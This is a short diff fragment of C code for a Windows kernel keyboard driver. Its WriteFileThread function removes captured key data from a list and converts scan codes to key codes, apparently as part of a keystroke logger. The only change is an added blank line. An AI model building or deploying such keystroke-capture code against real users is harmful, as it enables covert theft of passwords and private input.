@@ -35,6 +35,7 @@ VOID WriteFileThread(PVOID Context)
 		{
 			PsTerminateSystemThread(STATUS_SUCCESS);
 		}
+		
 		pListEntry = ExInterlockedRemoveHeadList(&pKeyboardDeviceExtension->MessageList, &pKeyboardDeviceExtension->kLock);
 		pkData = CONTAINING_RECORD(pListEntry, KEY_DATA, ListEntry);
 		//ConvertScanCodeToKeyCode将按键放入keys[0],后两个存储特殊按键
